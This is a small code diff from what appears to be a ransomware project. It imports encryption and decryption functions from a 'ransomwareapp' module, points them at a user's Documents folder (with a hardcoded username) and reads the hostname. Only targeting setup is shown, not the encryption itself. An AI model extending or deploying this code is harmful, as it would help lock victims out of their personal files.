@@ -8,8 +8,9 @@ import random
 from ransomwareapp import decryptionfile, encryptionfile
 
 # Replace 'your_directory_path' with the actual path to your directory
-print(os.getlogin())   
-directory_path = '/home/' + os.getlogin() + '/Documents/'
+# print(os.getlogin())   
+# directory_path = '/home/' + os.getlogin() + '/Documents/'
+directory_path = '/home/' + 'sharan-rao' + '/Documents/'
 
 Org_file_list=[]
 system_name = socket.gethostname()
